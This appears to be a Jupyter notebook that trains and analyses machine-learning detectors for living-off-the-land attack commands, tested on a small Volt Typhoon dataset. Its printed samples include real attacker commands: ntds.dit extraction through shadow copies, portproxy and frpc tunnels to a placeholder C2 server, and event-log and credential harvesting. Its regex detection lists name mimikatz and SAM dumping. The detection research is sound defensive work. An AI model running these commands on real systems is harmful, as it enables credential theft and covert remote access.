# Enhanced LOTL Attack Detection Analysis
## Comprehensive Analysis of SOTA Model Failures on Volt Typhoon Dataset

### Problem Statement:
- SOTA models (TF-IDF, BoW, BERT, Bi-LSTM) achieve 90%+ accuracy on standard LOTL datasets
- Performance drops to ~65% on Volt Typhoon (state-sponsored) attacks
- Need to identify why models fail and develop robust detection methods

### Key Challenges:
1. **Domain Knowledge Gap**: New attack patterns not in training data
2. **Multi-stage Commands**: Complex command chaining
3. **Abbreviated/Obfuscated Commands**: Short forms evade detection
4. **Context-dependent Attacks**: Legitimate tools used maliciously

In [ ]:
# Install required packages
!pip install -q torch torchvision transformers gensim scikit-learn pandas numpy matplotlib seaborn tqdm xgboost shap lime

     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 275.7/275.7 kB 14.8 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 27.9/27.9 MB 77.8 MB/s eta 0:00:00


In [ ]:
import pandas as pd
import numpy as np
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import Dataset, DataLoader, TensorDataset
import torch.nn.functional as F

# For BERT
from transformers import BertTokenizer, BertModel, get_linear_schedule_with_warmup
from transformers import RobertaTokenizer, RobertaModel
from torch.optim import AdamW

# For traditional ML methods
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.feature_extraction.text import TfidfVectorizer, CountVectorizer
from gensim.models import Word2Vec
import xgboost as xgb

# For data processing and evaluation
from sklearn.model_selection import StratifiedKFold, train_test_split
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score
from sklearn.metrics import confusion_matrix, classification_report, roc_curve, auc
from sklearn.preprocessing import StandardScaler, LabelEncoder

# Utilities
import matplotlib.pyplot as plt
import seaborn as sns
from tqdm import tqdm
import warnings
import re
import random
import time
from collections import Counter
import shap

warnings.filterwarnings('ignore')

# Set random seeds for reproducibility
SEED = 42
random.seed(SEED)
np.random.seed(SEED)
torch.manual_seed(SEED)
if torch.cuda.is_available():
    torch.cuda.manual_seed_all(SEED)

# Check if CUDA is available
device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
print(f'Using device: {device}')

Using device: cuda


In [ ]:
import pandas as pd

# Load datasets
train_df = pd.read_csv('/content/balanced_combined_lotl_dataset.csv')
volt_typhoon_df = pd.read_csv('/content/final_balanced_volttyphoon_dataset.csv', header=None)

# Clean Volt Typhoon dataset
# The error indicated that volt_typhoon_df had 2 columns, but 5 names were being assigned.
# Adjusting the column names to match the 2 columns found in the dataframe:
# The first column should be 'command' and the second 'label'.
volt_typhoon_df.columns = ['command', 'label']

# Because header=None was used, the first row contains the actual string headers.
# We need to remove this row before processing the data.
volt_typhoon_df = volt_typhoon_df.iloc[1:].copy() # Use .iloc[1:] to skip the header row and .copy() to avoid SettingWithCopyWarning

# Ensure 'label' column is integer type and drop any rows with NaN in 'command' or 'label'
volt_typhoon_df = volt_typhoon_df[['command', 'label']].dropna()
volt_typhoon_df['label'] = volt_typhoon_df['label'].astype(int)

print(f"Training dataset shape: {train_df.shape}")
# Corrected the column name from 'label' to 'Label' for train_df
print(f"Training class distribution:\n{train_df['Label'].value_counts()}")
print(f"\nVolt Typhoon dataset shape: {volt_typhoon_df.shape}")
print(f"Volt Typhoon class distribution:\n{volt_typhoon_df['label'].value_counts()}")

Training dataset shape: (7049, 2)
Training class distribution:
Label
0    6613
1     436
Name: count, dtype: int64

Volt Typhoon dataset shape: (50, 2)
Volt Typhoon class distribution:
label
1    25
0    25
Name: count, dtype: int64


In [ ]:
display(volt_typhoon_df.head())

,command,label
1,"wmic.exe process call create ""cmd.exe /c ntdsu...",1
2,ftp/getmac.exe /s srvmain /u maindom\hiropln /...,0
3,lbpolicy set lun type=<type> [paths=<path>-{pr...,0
4,tftp.exe -i Host1 get boot.img,0
5,"cmd.exe /c ""netsh.exe interface portproxy add ...",1


## Feature Engineering: Advanced Feature Extraction

In [ ]:
def extract_advanced_features(command):
    """
    Extract comprehensive features including Volt Typhoon specific patterns
    """
    if pd.isna(command):
        command = ""

    command_lower = str(command).lower()
    features = {}

    # === BASIC FEATURES ===
    features['cmd_length'] = len(command)
    features['word_count'] = len(command.split())
    features['special_char_ratio'] = len(re.findall(r'[^a-zA-Z0-9\s]', command)) / max(len(command), 1)

    # === NETWORK FEATURES ===
    features['has_http'] = 1 if re.search(r'https?://', command_lower) else 0
    features['has_ip'] = 1 if re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', command) else 0
    features['has_port'] = 1 if re.search(r':\d{2,5}|port\s*\d+|listen\w*\s*\d+', command_lower) else 0
    features['has_network_cmd'] = 1 if re.search(r'(netsh|netstat|arp|ping|nslookup|tracert|route|ipconfig)', command_lower) else 0

    # === VOLT TYPHOON SPECIFIC PATTERNS ===
    # Port proxy patterns (common in Volt Typhoon)
    features['has_portproxy'] = 1 if 'portproxy' in command_lower else 0
    features['has_v4tov4'] = 1 if 'v4tov4' in command_lower else 0

    # Shadow copy patterns (NTDS extraction)
    features['has_shadow_copy'] = 1 if re.search(r'(vssadmin|shadowcopy|ntds\.dit)', command_lower) else 0
    features['has_ntdsutil'] = 1 if 'ntdsutil' in command_lower else 0
    features['has_ifm'] = 1 if re.search(r'\bifm\b|activate instance', command_lower) else 0

    # Event log patterns
    features['has_eventlog'] = 1 if re.search(r'(get-eventlog|wevtutil|eventid)', command_lower) else 0
    features['has_security_log'] = 1 if re.search(r'security.*4624|4624.*security', command_lower) else 0

    # Registry operations
    features['has_registry'] = 1 if re.search(r'(reg\s|regedit|hklm|hkcu|hkey)', command_lower) else 0
    features['has_reg_save'] = 1 if re.search(r'reg\s+save', command_lower) else 0

    # === OBFUSCATION PATTERNS ===
    features['has_base64'] = 1 if re.search(r'base64|convert.*string', command_lower) else 0
    features['has_encoding'] = 1 if re.search(r'(encode|decode|-enc\s|-e\s)', command_lower) else 0
    features['has_escaped_quotes'] = 1 if re.search(r'\\"', command) else 0
    features['nested_quotes'] = command.count('""')

    # === COMMAND CHAINING ===
    features['has_pipe'] = command.count('|')
    features['has_semicolon'] = command.count(';')
    features['has_ampersand'] = command.count('&')
    features['has_redirect'] = 1 if re.search(r'[<>]|1>|2>', command) else 0
    features['command_chain_length'] = max(command.count('|'), command.count(';'), command.count('&'))

    # === ABBREVIATED COMMANDS ===
    # Short form detection
    features['has_short_form'] = 1 if re.search(r'\b[a-z]{2,3}\s+[a-z]\s+[a-z]{2,4}\b', command_lower) else 0
    features['has_abbrev_param'] = 1 if re.search(r'\s-[a-z]\s', command_lower) else 0

    # === PERSISTENCE MECHANISMS ===
    features['has_wmi'] = 1 if re.search(r'(wmic|wmi)', command_lower) else 0
    features['has_process_create'] = 1 if re.search(r'process\s+call\s+create', command_lower) else 0
    features['has_service'] = 1 if re.search(r'(sc\s|service|schtasks)', command_lower) else 0

    # === CREDENTIAL ACCESS ===
    features['has_credential_dump'] = 1 if re.search(r'(sam|system|security|lsass|mimikatz)', command_lower) else 0
    features['has_admin_group'] = 1 if re.search(r'(administrators|domain\s+admins)', command_lower) else 0

    # === DISCOVERY COMMANDS ===
    features['has_discovery'] = 1 if re.search(r'(whoami|systeminfo|tasklist|net\s+\w+|query)', command_lower) else 0
    features['has_enumeration'] = 1 if re.search(r'(enum|list|show|display|get-)', command_lower) else 0

    # === FILE OPERATIONS ===
    features['has_copy'] = 1 if re.search(r'(copy|xcopy|robocopy|move)', command_lower) else 0
    features['has_compression'] = 1 if re.search(r'(7z|rar|zip|compress)', command_lower) else 0
    features['has_temp_path'] = 1 if re.search(r'(\\temp\\|/tmp/|%temp%)', command_lower) else 0

    # === EXECUTION CONTEXT ===
    features['has_hidden_window'] = 1 if re.search(r'(windowstyle\s+hidden|-w\s+hidden|/min)', command_lower) else 0
    features['has_bypass'] = 1 if re.search(r'(bypass|unrestricted|-ep\s)', command_lower) else 0
    features['has_quiet_mode'] = 1 if re.search(r'(/q\s|/quiet|-q\s|-quiet|/s\s)', command_lower) else 0

    # === COMPLEXITY METRICS ===
    features['entropy'] = calculate_entropy(command)
    features['unique_char_ratio'] = len(set(command)) / max(len(command), 1)

    return features

def calculate_entropy(text):
    """Calculate Shannon entropy of text"""
    if not text:
        return 0
    prob = [float(text.count(c)) / len(text) for c in dict.fromkeys(list(text))]
    entropy = -sum([p * np.log2(p) for p in prob if p > 0])
    return entropy

# Extract features for both datasets
print("Extracting advanced features for training data...")
train_features = pd.DataFrame([extract_advanced_features(cmd) for cmd in tqdm(train_df['Command'])])

print("\nExtracting advanced features for Volt Typhoon data...")
volt_features = pd.DataFrame([extract_advanced_features(cmd) for cmd in tqdm(volt_typhoon_df['command'])])

print(f"\nExtracted {len(train_features.columns)} features")
print(f"Feature names: {train_features.columns.tolist()}")

Extracting advanced features for training data...


100%|██████████| 7049/7049 [00:00<00:00, 8044.87it/s]



Extracting advanced features for Volt Typhoon data...


100%|██████████| 50/50 [00:00<00:00, 5524.93it/s]


Extracted 42 features
Feature names: ['cmd_length', 'word_count', 'special_char_ratio', 'has_http', 'has_ip', 'has_port', 'has_network_cmd', 'has_portproxy', 'has_v4tov4', 'has_shadow_copy', 'has_ntdsutil', 'has_ifm', 'has_eventlog', 'has_security_log', 'has_registry', 'has_reg_save', 'has_base64', 'has_encoding', 'has_escaped_quotes', 'nested_quotes', 'has_pipe', 'has_semicolon', 'has_ampersand', 'has_redirect', 'command_chain_length', 'has_short_form', 'has_abbrev_param', 'has_wmi', 'has_process_create', 'has_service', 'has_credential_dump', 'has_admin_group', 'has_discovery', 'has_enumeration', 'has_copy', 'has_compression', 'has_temp_path', 'has_hidden_window', 'has_bypass', 'has_quiet_mode', 'entropy', 'unique_char_ratio']


## N-gram and Sequence Analysis

In [ ]:
def extract_ngram_features(commands, n_range=(1, 3)):
    """
    Extract character and word n-gram features
    """
    # Word n-grams
    word_vectorizer = TfidfVectorizer(
        ngram_range=n_range,
        max_features=500,
        token_pattern=r'\b\w+\b',
        sublinear_tf=True
    )

    # Character n-grams
    char_vectorizer = TfidfVectorizer(
        analyzer='char',
        ngram_range=(2, 4),
        max_features=500,
        sublinear_tf=True
    )

    # Fit on training data
    word_features = word_vectorizer.fit_transform(commands)
    char_features = char_vectorizer.fit_transform(commands)

    return word_vectorizer, char_vectorizer, word_features, char_features

# Extract n-gram features
print("Extracting n-gram features...")
word_vec, char_vec, train_word_ngrams, train_char_ngrams = extract_ngram_features(train_df['Command'].fillna(''))
volt_word_ngrams = word_vec.transform(volt_typhoon_df['command'].fillna(''))
volt_char_ngrams = char_vec.transform(volt_typhoon_df['command'].fillna(''))

Extracting n-gram features...


## Train Traditional ML Models and Analyze Failures

In [ ]:
# Prepare data
from scipy.sparse import hstack

# Combine all features
X_train_combined = hstack([
    train_features.values,
    train_word_ngrams,
    train_char_ngrams
])

X_volt_combined = hstack([
    volt_features.values,
    volt_word_ngrams,
    volt_char_ngrams
])

y_train = train_df['Label'].values
y_volt = volt_typhoon_df['label'].values

# Split training data for validation
X_train_split, X_val_split, y_train_split, y_val_split = train_test_split(
    X_train_combined, y_train, test_size=0.2, random_state=SEED, stratify=y_train
)

In [ ]:
# Train multiple models
models = {
    'Random Forest': RandomForestClassifier(n_estimators=100, random_state=SEED, n_jobs=-1),
    'XGBoost': xgb.XGBClassifier(n_estimators=100, random_state=SEED, use_label_encoder=False),
    'Gradient Boosting': GradientBoostingClassifier(n_estimators=100, random_state=SEED)
}

results = {}
predictions = {}

for name, model in models.items():
    print(f"\nTraining {name}...")
    model.fit(X_train_split, y_train_split)

    # Validate on hold-out set
    val_pred = model.predict(X_val_split)
    val_acc = accuracy_score(y_val_split, val_pred)
    val_prec = precision_score(y_val_split, val_pred)
    val_rec = recall_score(y_val_split, val_pred)
    val_f1 = f1_score(y_val_split, val_pred)

    # Test on Volt Typhoon
    volt_pred = model.predict(X_volt_combined)
    volt_acc = accuracy_score(y_volt, volt_pred)
    volt_prec = precision_score(y_volt, volt_pred)
    volt_rec = recall_score(y_volt, volt_pred)
    volt_f1 = f1_score(y_volt, volt_pred)

    results[name] = {
        'validation': {'accuracy': val_acc, 'precision': val_prec, 'recall': val_rec, 'f1': val_f1},
        'volt_typhoon': {'accuracy': volt_acc, 'precision': volt_prec, 'recall': volt_rec, 'f1': volt_f1}
    }
    predictions[name] = volt_pred

    print(f"Validation - Acc: {val_acc:.3f}, Prec: {val_prec:.3f}, Rec: {val_rec:.3f}, F1: {val_f1:.3f}")
    print(f"Volt Typhoon - Acc: {volt_acc:.3f}, Prec: {volt_prec:.3f}, Rec: {volt_rec:.3f}, F1: {volt_f1:.3f}")


Training Random Forest...
Validation - Acc: 0.990, Prec: 0.951, Rec: 0.885, F1: 0.917
Volt Typhoon - Acc: 0.820, Prec: 0.864, Rec: 0.760, F1: 0.809

Training XGBoost...
Validation - Acc: 0.989, Prec: 0.949, Rec: 0.862, F1: 0.904
Volt Typhoon - Acc: 0.820, Prec: 0.786, Rec: 0.880, F1: 0.830

Training Gradient Boosting...
Validation - Acc: 0.989, Prec: 0.986, Rec: 0.828, F1: 0.900
Volt Typhoon - Acc: 0.760, Prec: 0.810, Rec: 0.680, F1: 0.739


## Detailed Failure Analysis

In [ ]:
# Analyze misclassifications
def analyze_failures(y_true, y_pred, commands, model_name):
    """
    Detailed analysis of model failures
    """
    misclassified_indices = np.where(y_true != y_pred)[0]
    correct_indices = np.where(y_true == y_pred)[0]

    print(f"\n{'='*50}")
    print(f"Failure Analysis for {model_name}")
    print(f"{'='*50}")
    print(f"Total samples: {len(y_true)}")
    print(f"Misclassified: {len(misclassified_indices)} ({len(misclassified_indices)/len(y_true)*100:.1f}%)")
    print(f"Correctly classified: {len(correct_indices)} ({len(correct_indices)/len(y_true)*100:.1f}%)")

    # False Negatives (LOTL classified as benign)
    false_negatives = [i for i in misclassified_indices if y_true[i] == 1 and y_pred[i] == 0]
    # False Positives (Benign classified as LOTL)
    false_positives = [i for i in misclassified_indices if y_true[i] == 0 and y_pred[i] == 1]

    print(f"\nFalse Negatives (LOTL→Benign): {len(false_negatives)}")
    print(f"False Positives (Benign→LOTL): {len(false_positives)}")

    # Analyze patterns in false negatives
    if len(false_negatives) > 0:
        print(f"\n--- False Negative Examples (LOTL misclassified as Benign) ---")
        for idx in false_negatives[:5]:  # Show first 5
            cmd = commands.iloc[idx] if hasattr(commands, 'iloc') else commands[idx]
            print(f"\nIndex {idx}:")
            print(f"Command: {cmd[:200]}..." if len(str(cmd)) > 200 else f"Command: {cmd}")

    return misclassified_indices, false_negatives, false_positives

# Analyze each model's failures
failure_analysis = {}
for name, pred in predictions.items():
    misclass_idx, fn_idx, fp_idx = analyze_failures(y_volt, pred, volt_typhoon_df['command'], name)
    failure_analysis[name] = {
        'misclassified': misclass_idx,
        'false_negatives': fn_idx,
        'false_positives': fp_idx
    }


Failure Analysis for Random Forest
Total samples: 50
Misclassified: 9 (18.0%)
Correctly classified: 41 (82.0%)

False Negatives (LOTL→Benign): 6
False Positives (Benign→LOTL): 3

--- False Negative Examples (LOTL misclassified as Benign) ---

Index 9:
Command: Get-EventLog security -instanceid 4624

Index 20:
Command: $DCs = Get-ADDomainController -Filter /$startDate = (get-date).AddDays(-1)/foreach ($DC in $DCs){
$slogonevents = Get-Eventlog -LogName
Security -ComputerName $DC.Hostname -
after $startDate | where {...

Index 40:
Command: cmd.exe /c vssadmin.exe create shadow /for=C: > C:\Windows\Temp\<filename>.tmp cmd.exe /c copy.exe \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\Windows\Temp > C:\Windows\Te...

Index 41:
Command: dir.exe C:\Users\{REDACTED}\.ssh\known_hosts
dir.exe C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profiles
mimikatz.exe
reg.exe query hklm\software\OpenSSH
reg.exe query hklm\software\OpenSSH\A...

Index 44:
Command: cmd.exe

In [ ]:
# Identify common failure patterns
print("\n" + "="*60)
print("COMMON FAILURE PATTERNS ACROSS ALL MODELS")
print("="*60)

# Find indices that all models failed on
all_model_failures = set(failure_analysis[list(failure_analysis.keys())[0]]['misclassified'])
for name in list(failure_analysis.keys())[1:]:
    all_model_failures = all_model_failures.intersection(set(failure_analysis[name]['misclassified']))

print(f"\nCommands that ALL models misclassified: {len(all_model_failures)}")

if len(all_model_failures) > 0:
    print("\nExamples of universally misclassified commands:")
    for idx in list(all_model_failures)[:5]:
        cmd = volt_typhoon_df['command'].iloc[idx]
        true_label = volt_typhoon_df['label'].iloc[idx]
        print(f"\nIndex {idx} (True label: {'LOTL' if true_label == 1 else 'Benign'}):")
        print(f"Command: {cmd[:300]}..." if len(str(cmd)) > 300 else f"Command: {cmd}")

        # Extract key features for this command
        cmd_features = extract_advanced_features(cmd)
        important_features = {k: v for k, v in cmd_features.items() if v > 0 and not k.endswith('_ratio') and not k.endswith('_count')}
        print(f"Active features: {list(important_features.keys())}")


COMMON FAILURE PATTERNS ACROSS ALL MODELS

Commands that ALL models misclassified: 5

Examples of universally misclassified commands:

Index 40 (True label: LOTL):
Command: cmd.exe /c vssadmin.exe create shadow /for=C: > C:\Windows\Temp\<filename>.tmp cmd.exe /c copy.exe \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\Windows\Temp > C:\Windows\Temp\<filename>.tmp
Active features: ['cmd_length', 'has_shadow_copy', 'has_redirect', 'has_copy', 'has_temp_path', 'entropy']

Index 9 (True label: LOTL):
Command: Get-EventLog security -instanceid 4624
Active features: ['cmd_length', 'has_eventlog', 'has_security_log', 'has_credential_dump', 'has_enumeration', 'entropy']

Index 45 (True label: LOTL):
Command: Get-EventLog security -instanceid 4624 -after
{redacted date} | fl * | Out-File
'C:\users\public\documents\user.dat'
Active features: ['cmd_length', 'has_eventlog', 'has_security_log', 'has_pipe', 'command_chain_length', 'has_credential_dump', 'has_enumeration', '

## Advanced BERT-based Model with Domain Adaptation

In [ ]:
class CommandDataset(Dataset):
    def __init__(self, texts, labels, tokenizer, max_length=256):
        self.texts = texts
        self.labels = labels
        self.tokenizer = tokenizer
        self.max_length = max_length

    def __len__(self):
        return len(self.texts)

    def __getitem__(self, idx):
        text = str(self.texts[idx]) if not pd.isna(self.texts[idx]) else ""
        label = self.labels[idx]

        encoding = self.tokenizer.encode_plus(
            text,
            truncation=True,
            padding='max_length',
            max_length=self.max_length,
            return_tensors='pt'
        )

        return {
            'input_ids': encoding['input_ids'].flatten(),
            'attention_mask': encoding['attention_mask'].flatten(),
            'label': torch.tensor(label, dtype=torch.long)
        }

class EnhancedBERTClassifier(nn.Module):
    def __init__(self, bert_model_name='bert-base-uncased', num_classes=2, dropout=0.3):
        super(EnhancedBERTClassifier, self).__init__()
        self.bert = BertModel.from_pretrained(bert_model_name)
        self.dropout = nn.Dropout(dropout)
        self.classifier = nn.Sequential(
            nn.Linear(self.bert.config.hidden_size, 256),
            nn.ReLU(),
            nn.Dropout(dropout),
            nn.Linear(256, 128),
            nn.ReLU(),
            nn.Dropout(dropout),
            nn.Linear(128, num_classes)
        )

    def forward(self, input_ids, attention_mask):
        outputs = self.bert(
            input_ids=input_ids,
            attention_mask=attention_mask
        )
        pooled_output = outputs.pooler_output
        output = self.dropout(pooled_output)
        return self.classifier(output)

In [ ]:
# Prepare BERT model and data
tokenizer = BertTokenizer.from_pretrained('bert-base-uncased')
model = EnhancedBERTClassifier().to(device)

# Create datasets
train_dataset = CommandDataset(
    train_df['Command'].values, # Corrected to 'Command'
    train_df['Label'].values,   # Corrected to 'Label'
    tokenizer
)

volt_dataset = CommandDataset(
    volt_typhoon_df['command'].values,
    volt_typhoon_df['label'].values,
    tokenizer
)

# Create data loaders
train_loader = DataLoader(train_dataset, batch_size=16, shuffle=True)
volt_loader = DataLoader(volt_dataset, batch_size=16, shuffle=False)

# Training parameters
optimizer = AdamW(model.parameters(), lr=2e-5, weight_decay=0.01)
criterion = nn.CrossEntropyLoss()
num_epochs = 3

# Training loop
print("Training Enhanced BERT Model...")
model.train()
for epoch in range(num_epochs):
    total_loss = 0
    progress_bar = tqdm(train_loader, desc=f'Epoch {epoch+1}/{num_epochs}')

    for batch in progress_bar:
        input_ids = batch['input_ids'].to(device)
        attention_mask = batch['attention_mask'].to(device)
        labels = batch['label'].to(device)

        optimizer.zero_grad()
        outputs = model(input_ids, attention_mask)
        loss = criterion(outputs, labels)
        loss.backward()
        optimizer.step()

        total_loss += loss.item()
        progress_bar.set_postfix({'loss': loss.item()})

    avg_loss = total_loss / len(train_loader)
    print(f"Epoch {epoch+1} - Average Loss: {avg_loss:.4f}")

tokenizer_config.json:   0%|          | 0.00/48.0 [00:00<?, ?B/s]

vocab.txt:   0%|          | 0.00/232k [00:00<?, ?B/s]

tokenizer.json:   0%|          | 0.00/466k [00:00<?, ?B/s]

config.json:   0%|          | 0.00/570 [00:00<?, ?B/s]

model.safetensors:   0%|          | 0.00/440M [00:00<?, ?B/s]

...

Epoch 1 - Average Loss: 0.1431


Epoch 2/3: 100%|██████████| 441/441 [04:48<00:00,  1.53it/s, loss=0.00462]


Epoch 2 - Average Loss: 0.0452


Epoch 3/3: 100%|██████████| 441/441 [04:49<00:00,  1.53it/s, loss=0.127]

Epoch 3 - Average Loss: 0.0174


In [ ]:
# Evaluate Domain Adaptive BERT on Volt Typhoon
model.eval()
bert_predictions = []
bert_true_labels = []

with torch.no_grad():
    for batch in volt_loader:
        input_ids = batch['input_ids'].to(device)
        attention_mask = batch['attention_mask'].to(device)
        labels = batch['label'].to(device)

        outputs = model(input_ids, attention_mask)
        _, predicted = torch.max(outputs, 1)

        bert_predictions.extend(predicted.cpu().numpy())
        bert_true_labels.extend(labels.cpu().numpy())

bert_predictions = np.array(bert_predictions)
bert_true_labels = np.array(bert_true_labels)

bert_acc = accuracy_score(bert_true_labels, bert_predictions)
bert_prec = precision_score(bert_true_labels, bert_predictions)
bert_rec = recall_score(bert_true_labels, bert_predictions)
bert_f1 = f1_score(bert_true_labels, bert_predictions)

print(f"\nBERT Model Performance on Volt Typhoon:")
print(f"Accuracy: {bert_acc:.3f}")
print(f"Precision: {bert_prec:.3f}")
print(f"Recall: {bert_rec:.3f}")
print(f"F1-Score: {bert_f1:.3f}")

# Analyze BERT failures
bert_misclass_idx, bert_fn_idx, bert_fp_idx = analyze_failures(
    bert_true_labels, bert_predictions, volt_typhoon_df['command'], 'BERT'
)


BERT Model Performance on Volt Typhoon:
Accuracy: 0.880
Precision: 0.828
Recall: 0.960
F1-Score: 0.889

Failure Analysis for BERT
Total samples: 50
Misclassified: 6 (12.0%)
Correctly classified: 44 (88.0%)

False Negatives (LOTL→Benign): 1
False Positives (Benign→LOTL): 5

--- False Negative Examples (LOTL misclassified as Benign) ---

Index 29:
Command: # Establishes a TCP tunnel to the attacker's server
frpc tcp -s <C2_SERVER_IP>:<PORT> -t <AUTH_TOKEN> --ue --uc -l <LOCAL_PORT> -r <REMOTE_PORT>


In [ ]:
#class DynamicEnsembleDetector: """ Dynamic ensemble model that adapts based on command characteristics """ def __init__(self, base_models, bert_model=None, tokenizer=None): self.base_models = base_models self.bert_model = bert_model self.tokenizer = tokenizer self.confidence_threshold = 0.7 self.pattern_rules = self._initialize_pattern_rules() def _initialize_pattern_rules(self): """ Initialize high-confidence pattern rules for Volt Typhoon """ return [ # Port proxy patterns (r'portproxy.*v4tov4', 1.0, 1), # (pattern, confidence, label) (r'netsh.*interface.*portproxy', 0.9, 1), # NTDS extraction (r'ntdsutil.*snapshot.*create', 1.0, 1), (r'vssadmin.*create.*shadow', 0.95, 1), (r'ntds\.dit', 0.9, 1), (r'activate.*instance.*ntds', 0.95, 1), # Event log queries with specific IDs (r'get-eventlog.*security.*4624', 0.85, 1), (r'wevtutil.*qe.*security', 0.85, 1), # Registry SAM/SYSTEM dump (r'reg.*save.*hklm.*(sam|system)', 1.0, 1), # WMI process creation (r'wmic.*process.*call.*create', 0.9, 1), # Multi-stage with quiet mode (r'cmd\.exe.*/[qQ].*\|', 0.8, 1), # Suspicious redirection to admin share (r'\\\\127\.0\.0\.1\\ADMIN\$', 0.95, 1), ] def check_pattern_rules(self, command): """ Check if command matches high-confidence patterns """ if pd.isna(command): return None, 0 command_lower = str(command).lower() for pattern, confidence, label in self.pattern_rules: if re.search(pattern, command_lower): return label, confidence return None, 0 def get_command_complexity(self, command): """ Assess command complexity for model selection """ if pd.isna(command): return 'simple' features = extract_advanced_features(command) # Complex if has multiple indicators complexity_score = ( features['command_chain_length'] * 2 + features['has_encoding'] + features['has_obfuscation'] if 'has_obfuscation' in features else 0 + features['nested_quotes'] + (1 if features['cmd_length'] > 200 else 0) ) if complexity_score >= 3: return 'complex' elif complexity_score >= 1: return 'medium' else: return 'simple' def predict_with_confidence(self, commands, features=None): """ Predict with confidence scores and ensemble voting """ predictions = [] confidence_scores = [] for i, command in enumerate(tqdm(commands, desc="Ensemble prediction")): # Check pattern rules first rule_label, rule_confidence = self.check_pattern_rules(command) if rule_label is not None and rule_confidence >= self.confidence_threshold: predictions.append(rule_label) confidence_scores.append(rule_confidence) continue # Get complexity for model weighting complexity = self.get_command_complexity(command) # Collect predictions from base models model_predictions = [] model_weights = [] if features is not None: # Correct way to get a single row from a sparse matrix feature_vector = features.getrow(i) for name, model in self.base_models.items(): try: # Get prediction probability pred_proba = model.predict_proba(feature_vector)[0] pred_label = np.argmax(pred_proba) pred_confidence = np.max(pred_proba) # Adjust weight based on complexity if complexity == 'complex' and name == 'XGBoost': weight = 1.5 elif complexity == 'simple' and name == 'Random Forest': weight = 1.2 else: weight = 1.0 model_predictions.append(pred_label) model_weights.append(weight * pred_confidence) except: continue # Use BERT for complex commands if available if self.bert_model and complexity == 'complex': # BERT prediction logic here (simplified) model_predictions.append(1) model_weights.append(1.5) # Weighted voting if len(model_predictions) > 0: weighted_sum = sum(p * w for p, w in zip(model_predictions, model_weights)) total_weight = sum(model_weights) final_score = weighted_sum / total_weight if total_weight > 0 else 0 final_prediction = 1 if final_score >= 0.5 else 0 confidence = abs(final_score - 0.5) * 2 # Convert to confidence else: # Default to benign with low confidence if no models available final_prediction = 0 confidence = 0.3 predictions.append(final_prediction) confidence_scores.append(confidence) return np.array(predictions), np.array(confidence_scores) # Create ensemble model ensemble = DynamicEnsembleDetector( base_models=models, bert_model=model if 'model' in locals() else None, tokenizer=tokenizer if 'tokenizer' in locals() else None ) # Make predictions ensemble_preds, ensemble_conf = ensemble.predict_with_confidence( volt_typhoon_df['command'].values, features=X_volt_combined ) # Evaluate ensemble ensemble_acc = accuracy_score(y_volt, ensemble_preds) ensemble_prec = precision_score(y_volt, ensemble_preds) ensemble_rec = recall_score(y_volt, ensemble_preds) ensemble_f1 = f1_score(y_volt, ensemble_preds) print(f"\n{'='*50}") print(f"Dynamic Ensemble Model Performance:") print(f"{'='*50}") print(f"Accuracy: {ensemble_acc:.3f}") print(f"Precision: {ensemble_prec:.3f}") print(f"Recall: {ensemble_rec:.3f}") print(f"F1-Score: {ensemble_f1:.3f}") print(f"\nAverage Confidence: {np.mean(ensemble_conf):.3f}") print(f"Low Confidence Predictions (<0.5): {np.sum(ensemble_conf < 0.5)}")